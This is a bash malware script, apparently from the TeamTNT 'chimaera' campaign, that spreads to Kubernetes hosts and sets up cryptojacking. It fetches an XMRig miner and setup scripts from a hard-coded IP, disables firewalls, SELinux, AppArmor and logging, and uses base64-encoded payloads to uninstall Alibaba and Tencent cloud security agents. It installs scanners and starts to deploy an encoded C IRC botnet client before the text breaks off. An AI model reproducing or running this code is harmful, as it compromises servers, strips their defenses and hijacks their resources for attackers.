#!/bin/bash

# wget -O - http://45.9.148.35/chimaera/sh/spread_kube_local.sh | bash

export LC_ALL=C;HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null
export HISTFILE=/dev/null 2>/dev/null;unset HISTFILE 2>/dev/null;HISTSIZE=0 2>/dev/null

if [ -f "/var/tmp/.tnt.docker.lock" ];then echo "spreading is running!" ; exit ; fi

export BASE_HTTP="http://45.9.148.35/chimaera"
export INITPLOAD="http://45.9.148.35/chimaera/sh/setup_xmr.sh"
export XMR64_BIT="http://45.9.148.35/chimaera/bin/64bit/xmrig"
export XMR32_BIT=""
export XMRarmBIT=""

export T1OUT="90"
export TEMPFILE="/tmp/"$RANDOM$RANDOM$RANDOM
SYSPACKS=("wget" "curl" "jq" "gcc" "make" "git" "golang" "go" "masscan" "libpcap" "libpcap-dev" "libpcap-devel" "coreutils" "alpine-sdk")

GETWHOAMI=$(whoami)
CHECK_SYS=$(uname -m)
export PATH=$PATH:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/.local/bin:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.8.8' 2>/dev/null || chattr -ia /etc/resolv.conf 2>/dev/null;echo 'nameserver 8.8.8.8' >> /etc/resolv.conf;chattr +i /etc/resolv.conf 2>/dev/null
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.4.4' 2>/dev/null || chattr -ia /etc/resolv.conf 2>/dev/null;echo 'nameserver 8.8.4.4' >> /etc/resolv.conf;chattr +i /etc/resolv.conf 2>/dev/null

ulimit -n 65535 2>/dev/null
	rm -rf /var/log/syslog 2>/dev/null;chattr -R -iua /tmp/ 2>/dev/null;chattr -R -iua /var/tmp/ 2>/dev/null
if type ufw 2>/dev/null 1>/dev/null; then ufw disable 2>/dev/null ; fi
if type iptables 2>/dev/null 1>/dev/null; then iptables -F 2>/dev/null ; fi
	sysctl kernel.nmi_watchdog=0 2>/dev/null 1>/dev/null
	setenforce 0 2>/dev/null
if [ -f "/proc/sys/kernel/nmi_watchdog" ]; then echo '0' >/proc/sys/kernel/nmi_watchdog 2>/dev/null 1>/dev/null; fi
if [ -f "/etc/sysctl.conf" ]; then echo 'kernel.nmi_watchdog=0' >> /etc/sysctl.conf 2>/dev/null 1>/dev/null; fi
if [ -f "/etc/selinux/config" ]; then echo SELINUX=disabled > /etc/selinux/config 2>/dev/null 1>/dev/null; fi
	systemctl stop apparmor 2>/dev/null ; service apparmor stop 2>/dev/null ; systemctl disable apparmor 2>/dev/null
	systemctl stop aliyun.service 2>/dev/null;service aliyun.service stop 2>/dev/null;systemctl disable aliyun.service 2>/dev/null
if ps aux | grep -i '[a]liyun'; then
    echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcKcmVtb3ZlX2FlZ2lzKCl7CmlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9IiBdO3RoZW4KICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9hZWdpc19kZWJ1ZwogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash 2>/dev/null 1>/dev/null
	echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash 2>/dev/null 1>/dev/null
if [ -f "/etc/init.d/agentwatch" ];then rm -rf /etc/init.d/agentwatch 2>/dev/null;fi
if [ -f "/usr/sbin/aliyun-service" ];then rm -rf /usr/sbin/aliyun-service 2>/dev/null;fi
if [ -f "/usr/local/aegis*" ];then rm -rf /usr/local/aegis* 2>/dev/null;fi
	systemctl stop aliyun.service 2>/dev/null;service aliyun.service stop 2>/dev/null;systemctl disable aliyun.service 2>/dev/null
	systemctl stop bcm-agent 2>/dev/null;service bcm-agent stop 2>/dev/null;yum remove bcm-agent -y 2>/dev/null ; apt-get remove bcm-agent -y 2>/dev/null  
elif ps aux | grep -i '[y]unjing'; then
if [ -f "/usr/local/qcloud/stargate/admin/uninstall.sh" ];then bash /usr/local/qcloud/stargate/admin/uninstall.sh;fi
if [ -f "/usr/local/qcloud/YunJing/uninst.sh" ];then bash /usr/local/qcloud/YunJing/uninst.sh;fi
if [ -f "/usr/local/qcloud/monitor/barad/admin/uninstall.sh" ];then bash /usr/local/qcloud/monitor/barad/admin/uninstall.sh;fi;fi
	ps aux | grep -v grep | grep 'Yun\|aegis' | awk '{print $2}' | xargs -I % kill -9 % 2>/dev/null
	rm -rf /usr/local/aegis 2>/dev/null;pkill aliyun-service 2>/dev/null
if type crontab 2>/dev/null 1>/dev/null; then crontab -f 2>/dev/null;fi

function remove_lock(){
rm -f /var/tmp/.tnt.docker.lock
}

function set_lock(){
mkdir -p /var/tmp/ 2>/dev/null
touch /var/tmp/.tnt.docker.lock
}

function setup_masscan(){ echo "setup masscan"
if type apk 2>/dev/null; then wget -q $BASE_HTTP/chimaera/bin/rpm_deb_apk/$(uname -m)-masscan.apk -O /tmp/.ms.apk
apk add /tmp/.ms.apk
rm -f /tmp/.ms.apk
fi
git clone git://github.com/robertdavidgraham/masscan /var/tmp/ms/ 2>/dev/null
cd /var/tmp/ms/
make
cp bin/masscan /usr/bin/masscan
chmod +x /usr/bin/masscan 2>/dev/null
make install
cd /root/ 2>/dev/null
rm -fr /var/tmp/ms/ 2>/dev/null 
}

function setup_zgrab(){ 
echo "setup zgrab"
export GOPATH=/root/go
go get github.com/zmap/zgrab
cd /root/go/src/github.com/zmap/zgrab/
go build
cp ./zgrab /usr/bin/zgrab
chmod +x /usr/bin/zgrab
cd /root/
rm -fr /root/go/src/github.com/ 
}		

function setup_ircbot(){
echo 'I2RlZmluZSBTVEFSVFVQCQkJLy8gU3RhcnQgb24gc3RhcnR1cD8KI3VuZGVmIElERU5UCQkJLy8gT25seSBlbmFibGUgdGhpcyBpZiB5b3UgYWJzb2x1dGVseSBoYXZlIHRvCiNkZWZpbmUgRkFLRU5BTUUgImt3b3JrZXIvMDg6MTUtZXZlbnRzIgkvLyBXaGF0IHlvdSB3YW50IHRoaXMgdG8gaGlkZSBhcwojZGVmaW5lIENIQU4gIiNEb2NrZXJBUEkiCS8vIENoYW5uZWwgdG8gam9pbgojZGVmaW5lIEtFWSAiIgkJLy8gVGhlIGtleSBvZiB0aGUgY2hhbm5lbAppbnQgbnVtc2VydmVycz0yOwkJLy8gTXVzdCBjaGFuZ2UgdGhpcyB0byBlcXVhbCBudW1iZXIgb2Ygc2VydmVycyBkb3duIHRoZXJlCmNoYXIgKnNlcnZlcnNbXSA9IHsJCS8vIExpc3QgdGhlIHNlcnZlcnMgaW4gdGhhdCBmb3JtYXQsIGFsd2F5cyBlbmQgaW4gKHZvaWQqKTAKCQkiNDUuOS4xNDguODUiLAogICAgICAgICJpcmMudGVhbXRudC5yZWQiLAogICAgICAgICh2b2lkKikwCn07CiNpbmNsdWRlIDxzdGRhcmcuaD4KI2luY2x1ZGUgPGVycm5vLmg+CiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3N0YXQuaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxzdHJpbmdzLmg+CiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN5cy90aW1lLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzaWduYWwuaD4KI2luY2x1ZGUgPGFycGEvaW5ldC5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHRpbWUuaD4KI2luY2x1ZGUgPHN5cy93YWl0Lmg+CiNpbmNsdWRlIDxzeXMvaW9jdGwuaD4KCmludCBzb2NrLGNoYW5nZXNlcnZlcnM9MDsKaW50ICpwaWRzLCBjc3VtPTAsIGFjdHVhbHBhcmVudDsKY2hhciAqc2VydmVyLCAqY2hhbiwgKmtleSwgKm5pY2ssICppZGVudCwgKnVzZXIsIGRpc2FibGVkPTAsIGV4ZWNmaWxlWzI1Nl0sZGlzcGFzc1syNTZdOwovL3Vuc2lnbmVkIGludCAqcGlkczsKdW5zaWduZWQgbG9uZyBzcG9vZnM9MCwgc3Bvb2ZzbT0wLCBudW1waWRzPTA7CmludCBzdHJ3aWxkbWF0Y2goY29uc3QgY2hhciogcGF0dGVybiwgY29uc3QgY2hhciogc3RyaW5nKSB7Cglzd2l0Y2goKnBhdHRlcm4pIHsKCQljYXNlICdcMCc6IHJldHVybiAqc3RyaW5nOwoJCWNhc2UgJyonOiByZXR1cm4gISghc3Ryd2lsZG1hdGNoKHBhdHRlcm4rMSwgc3RyaW5nKSB8fCAqc3RyaW5nICYmICFzdHJ3aWxkbWF0Y2gocGF0dGVybiwgc3RyaW5nKzEpKTsKCQljYXNlICc/JzogcmV0dXJuICEoKnN0cmluZyAmJiAhc3Ryd2lsZG1hdGNoKHBhdHRlcm4rMSwgc3RyaW5nKzEpKTsKCQlkZWZhdWx0OiByZXR1cm4gISgodG91cHBlcigqcGF0dGVybikgPT0gdG91cHBlcigqc3RyaW5nKSkgJiYgIXN0cndpbGRtYXRjaChwYXR0ZXJuKzEsIHN0cmluZysxKSk7Cgl9Cn0KaW50IFNlbmQoaW50IHNvY2ssIGNoYXIgKndvcmRzLCAuLi4pIHsKICAgICAgICBzdGF0aWMgY2hhciB0ZXh0QnVmZmVyWzEwMjRdOwogICAgICAgIHZhX2xpc3QgYXJnczsKICAgICAgICB2YV9zdGFydChhcmdzLCB3b3Jkcyk7CiAgICAgICAgdnNwcmludGYodGV4dEJ1ZmZlciwgd29yZHMsIGFyZ3MpOwogICAgICAgIHZhX2VuZChhcmdzKTsKICAgICAgICByZXR1cm4gd3JpdGUoc29jayx0ZXh0QnVmZmVyLHN0cmxlbih0ZXh0QnVmZmVyKSk7Cn0KaW50IG1mb3JrKGNoYXIgKnNlbmRlcikgewoJdW5zaWduZWQgaW50IHBhcmVudCwgKm5ld3BpZHMsIGk7CglpZiAoZGlzYWJsZWQgPT0gMSkgewoJCVNlbmQoc29jaywiTk9USUNFICVzIDpVbmFibGUgdG8gY29tcGx5LlxuIixzZW5kZXIpOwoJCXJldHVybiAxOwoJfQoJcGFyZW50PWZvcmsoKTsKCWlmIChwYXJlbnQgPD0gMCkgcmV0dXJuIHBhcmVudDsKCW51bXBpZHMrKzsKCW5ld3BpZHM9KHVuc2lnbmVkIGludCopbWFsbG9jKChudW1waWRzKzEpKnNpemVvZih1bnNpZ25lZCBpbnQpKTsKCWZvciAoaT0wO2k8bnVtcGlkcy0xO2krKykgbmV3cGlkc1tpXT1waWRzW2ldOwoJbmV3cGlkc1tudW1waWRzLTFdPXBhcmVudDsKCWZyZWUocGlkcyk7CglwaWRzPW5ld3BpZHM7CglyZXR1cm4gcGFyZW50Owp9CnVuc2lnbmVkIGxvbmcgZ2V0c3Bvb2YoKSB7CglpZiAoIXNwb29mcykgcmV0dXJuIHJhbmQoKTsKCWlmIChzcG9vZnNtID09IDEpIHJldHVybiBudG9obChzcG9vZnMpOwoJcmV0dXJuIG50b2hsKHNwb29mcysocmFuZCgpICUgc3Bvb2ZzbSkrMSk7Cn0Kdm9pZCBmaWx0ZXIoY2hhciAqYSkgeyB3aGlsZShhW3N0cmxlbihhKS0xXSA9PSAnXHInIHx8IGFbc3RybGVuKGEpLTFdID09ICdcbicpIGFbc3RybGVuKGEpLTFdPTA7IH0KY2hhciAqbWFrZXN0cmluZygpIHsKCWNoYXIgKnRtcDsKCWludCBsZW49KHJhbmQoKSU1KSs0LGk7CiAJRklMRSAqZmlsZTsKCXRtcD0oY2hhciopbWFsbG9jKGxlbisxKTsKIAltZW1zZXQodG1wLDAsbGVuKzEpOwogCWlmICgoZmlsZT1mb3BlbigiL3Vzci9kaWN0L3dvcmRzIiwiciIpKSA9PSBOVUxMKSBmb3IgKGk9MDtpPGxlbjtpKyspIHRtcFtpXT0ocmFuZCgpJSg5MS02NSkpKzY1OwoJZWxzZSB7CgkJaW50IGE9KChyYW5kKCkqcmFuZCgpKSU0NTQwMikrMTsKCQljaGFyIGJ1ZlsxMDI0XTsKCQlmb3IgKGk9MDtpPGE7aSsrKSBmZ2V0cyhidWYsMTAyNCxmaWxlKTsKCQltZW1zZXQoYnVmLDAsMTAyNCk7CgkJZmdldHMoYnVmLDEwMjQsZmlsZSk7CgkJZmlsdGVyKGJ1Zik7CgkJbWVtY3B5KHRtcCxidWYsbGVuKTsKCQlmY2xvc2UoZmlsZSk7Cgl9CglyZXR1cm4gdG1wOwp9CnZvaWQgaWRlbnRkKCkgewogICAgICAgIGludCBzb2NrbmFtZSxzb2NrZmQsc2luX3NpemUsdG1wc29jayxpOwogICAgICAgIHN0cnVjdCBzb2NrYWRkcl9pbiBteV9hZGRyLHRoZWlyX2FkZHI7CiAgICAgICAgY2hhciBzekJ1ZmZlclsxMDI0XTsKICAgICAgICBpZiAoKHNvY2tmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCkpID09IC0xKSByZXR1cm47CiAgICAgICAgbXlfYWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKICAgICAgICBteV9hZGRyLnNpbl9wb3J0ID0gaHRvbnMoMTEzKTsKICAgICAgICBteV9hZGRyLnNpbl9hZGRyLnNfYWRkciA9IElOQUREUl9BTlk7CiAgICAgICAgbWVtc2V0KCYobXlfYWRkci5zaW5femVybyksIDAsIDgpOwogICAgICAgIGlmIChiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZteV9hZGRyLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyKSkgPT0gLTEpIHJldHVybjsKICAgICAgICBpZiAobGlzdGVuKHNvY2tmZCwgMSkgPT0gLTEpIHJldHVybjsKICAgICAgICBpZiAoZm9yaygpID09IDApIHJldHVybjsKICAgICAgICBzaW5fc2l6ZSA9IHNpemVvZihzdHJ1Y3Qgc29ja2FkZHJfaW4pOwogICAgICAgIGlmICgodG1wc29jayA9IGFjY2VwdChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmdGhlaXJfYWRkciwgJnNpbl9zaXplKSkgPT0gLTEpIGV4aXQoMCk7CiAgICAgICAgZm9yKDs7KSB7CiAgICAgICAgICAgICAgICBmZF9zZXQgYmxhOwogICAgICAgICAgICAgICAgc3RydWN0IHRpbWV2YWwgdGltZWU7CiAgICAgICAgICAgICAgICBGRF9aRVJPKCZibGEpOwogICAgICAgICAgICAgICAgRkRfU0VUKHRtcHNvY2ssJmJsYSk7CiAgICAgICAgICAgICAgICB0aW1lZS50dl9zZWM9dGltZWUudHZfdXNlYz02MDsKICAgICAgICAgICAgICAgIGlmIChzZWxlY3QodG1wc29jayArIDEsJmJsYSwoZmRfc2V0KikwLChmZF9zZXQqKTAsJnRpbWVlKSA8IDApIGV4aXQoMCk7CiAgICAgICAgICAgICAgICBpZiAoRkRfSVNTRVQodG1wc29jaywmYmxhKSkgYnJlYWs7CiAgICAgICAgfQogICAgICAgIGkgPSByZWN2KHRtcHNvY2ssc3pCdWZmZXIsMTAyNCwwKTsKICAgICAgICBpZiAoaSA8PSAwIHx8IGkgPj0gMjApIGV4aXQoMCk7CiAgICAgICAgc3pCdWZmZXJbaV09MDsKICAgICAgICBpZiAoc3pCdWZmZXJbaS0xXSA9PSAnXG4nIHx8IHN6QnVmZmVyW2ktMV0gPT0gJ1xyJykgc3pCdWZmZXJbaS0xXT0wOwogICAgICAgIGlmIChzekJ1ZmZlcltpLTJdID09ICdcbicgfHwgc3pCdWZmZXJbaS0yXSA9PSAnXHInKSBzekJ1ZmZlcltpLTJdPTA7CglTZW5kKHRtcHNvY2ssIiVzIDogVVNFUklEIDogVU5JWCA6ICVzXG4iLHN6QnVmZmVyLGlkZW50KTsKICAgICAgICBjbG9zZSh0bXBzb2NrKTsKICAgICAgICBjbG9zZShzb2NrZmQpOwogICAgICAgIGV4aXQoMCk7Cn0KbG9uZyBwb3cobG9uZyBhLCBsb25nIGIpIHsKICAgICAgICBpZiAoYiA9PSAwKSByZXR1cm4gMTsKICAgICAgICBpZiAoYiA9PSAxKSByZXR1cm4gYTsKICAgICAgICByZXR1cm4gYSpwb3coYSxiLTEpOwp9CnVfc2hvcnQgaW5fY2tzdW0odV9zaG9ydCAqYWRkciwgaW50IGxlbikgewogICAgICAgIHJlZ2lzdGVyIGludCBubGVmdCA9IGxlbjsKICAgICAgICByZWdpc3RlciB1X3Nob3J0ICp3ID0gYWRkcjsKICAgICAgICByZWdpc3RlciBpbnQgc3VtID0gMDsKICAgICAgICB1X3Nob3J0IGFuc3dlciA9MDsKICAgICAgICB3aGlsZSAobmxlZnQgPiAxKSB7CiAgICAgICAgICAgICAgICBzdW0gKz0gKncrKzsKICAgICAgICAgICAgICAgIG5sZWZ0IC09IDI7CiAgICAgICAgfQogICAgICAgIGlmIChubGVmdCA9PSAxKSB7CiAgICAgICAgICAgICAgICAqKHVfY2hhciAqKSgmYW5zd2VyKSA9ICoodV9jaGFyICopdzsKICAgICAgICAgICAgICAgIHN1bSArPSBhbnN3ZXI7CiAgICAgICAgfQogICAgICAgIHN1bSA9IChzdW0gPj4gMTYpICsgKHN1bSAmIDB4ZmZmZik7CiAgICAgICAgc3VtICs9IChzdW0gPj4gMTYpOwogICAgICAgIGFuc3dlciA9IH5zdW07CiAgICAgICAgcmV0dXJuKGFuc3dlcik7Cn0Kdm9pZCBnZXQoaW50IHNvY2ssIGNoYXIgKnNlbmRlciwgaW50IGFyZ2MsIGNoYXIgKiphcmd2KSB7CiAgICAgICAgaW50IHNvY2syLGksZDsKICAgICAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gc2VydmVyOwogICAgICAgIHVuc2lnbmVkIGxvbmcgaXBhZGRyOwogICAgICAgIGNoYXIgYnVmWzEwMjRdOwogICAgICAgIEZJTEUgKmZpbGU7CiAgICAgICAgdW5zaWduZWQgY2hhciBidWZtWzQwOTZdOwogICAgICAgIGlmIChtZm9yayhzZW5kZXIpICE9IDApIHJldHVybjsKICAgICAgICBpZiAoYXJnYyA8IDIpIHsKICAgICAgICAgICAgICAgIFNlbmQoc29jaywiTk9USUNFICVzIDpHRVQgPGhvc3Q+IDxzYXZlIGFzPlxuIixzZW5kZXIpOwogICAgICAgICAgICAgICAgZXhpdCgwKTsKICAgICAgICB9CiAgICAgICAgaWYgKChzb2NrMiA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCkpID09IC0xKSB7CiAgICAgICAgICAgICAgICBTZW5kKHNvY2ssIk5PVElDRSAlcyA6VW5hYmxlIHRvIGNyZWF0ZSBzb2NrZXQuXG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICBleGl0KDApOwogICAgICAgIH0KICAgICAgICBpZiAoIXN0cm5jbXAoYXJndlsxXSwiaHR0cDovLyIsNykpIHN0cmNweShidWYsYXJndlsxXSs3KTsKICAgICAgICBlbHNlIHN0cmNweShidWYsYXJndlsxXSk7CiAgICAgICAgZm9yIChpPTA7aTxzdHJsZW4oYnVmKSAmJiBidWZbaV0gIT0gJy8nO2krKyk7CiAgICAgICAgYnVmW2ldPTA7CiAgICAgICAgc2VydmVyLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgICAgIHNlcnZlci5zaW5fcG9ydCA9IGh0b25zKDgwKTsKICAgICAgICBpZiAoKGlwYWRkciA9IGluZXRfYWRkcihidWYpKSA9PSAtMSkgewogICAgICAgICAgICAgICAgc3RydWN0IGhvc3RlbnQgKmhvc3RtOwogICAgICAgICAgICAgICAgaWYgKChob3N0bT1nZXRob3N0YnluYW1lKGJ1ZikpID09IE5VTEwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgU2VuZChzb2NrLCJOT1RJQ0UgJXMgOlVuYWJsZSB0byByZXNvbHZlIGFkZHJlc3MuXG4iLHNlbmRlcik7CiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBtZW1jcHkoKGNoYXIqKSZzZXJ2ZXIuc2luX2FkZHIsIGhvc3RtLT5oX2FkZHIsIGhvc3RtLT5oX2xlbmd0aCk7CiAgICAgICAgfQogICAgICAgIGVsc2Ugc2VydmVyLnNpbl9hZGRyLnNfYWRkciA9IGlwYWRkcjsKICAgICAgICBtZW1zZXQoJihzZXJ2ZXIuc2luX3plcm8pLCAwLCA4KTsKICAgICAgICBpZiAoY29ubmVjdChzb2NrMiwoc3RydWN0IHNvY2t